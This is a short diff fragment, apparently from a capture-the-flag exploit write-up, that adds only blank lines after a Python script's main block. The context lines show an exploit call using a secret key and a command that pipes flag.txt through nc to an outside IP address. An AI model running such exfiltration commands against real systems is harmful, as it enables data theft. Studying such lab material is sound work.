@@ -57,3 +57,5 @@ if __name__ == '__main__':
     command = 'cat flag.txt | nc -4u -w1 12.12.12.12 4444'
     exp(url,SECRET_KEY,command)
 ```
+
+
